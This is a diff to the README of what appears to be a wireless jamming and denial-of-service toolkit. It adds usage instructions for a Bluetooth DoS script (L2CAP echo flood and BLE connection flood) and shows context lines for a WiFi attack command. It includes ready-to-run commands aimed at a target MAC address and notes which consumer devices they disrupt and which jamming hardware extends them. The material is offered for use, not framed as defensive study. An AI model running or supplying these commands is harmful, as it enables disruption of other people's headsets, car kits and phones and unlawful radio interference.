@@ -46,3 +46,18 @@ sudo python3 pc_jammer.py attack -b AA:BB:CC:DD:EE:FF
 Note: internal laptop WiFi cards usually cannot inject — use a USB adapter
 (Alfa AWUS036ACM/ACH, TP-Link Archer T2U). For Bluetooth there is no PC-native
 path; BLE spam needs an ESP32 or Ubertooth.
+
+## bt_jammer.py
+Bluetooth DoS toolkit — runs on your PC's built-in BT adapter, no extra hardware.
+L2CAP echo flood (BTStorm/bluthat equivalent) + BLE connect-flood.
+
+```
+sudo apt install bluez
+python3 bt_jammer.py scan -t 20                    # find your BT device MAC
+python3 bt_jammer.py flood AA:BB:CC:DD:EE:FF -w 8  # L2CAP echo flood (Classic BT)
+python3 bt_jammer.py ble-flood AA:BB:CC:DD:EE:FF    # BLE connect churn
+```
+
+Limits: `flood` only affects Classic Bluetooth devices (headsets, speakers,
+car kits, older phones). BLE-only gadgets ignore L2CAP echo — raw BLE jamming
+needs NRF24L01+PA+LNA (HailHound) or btlejack hardware.
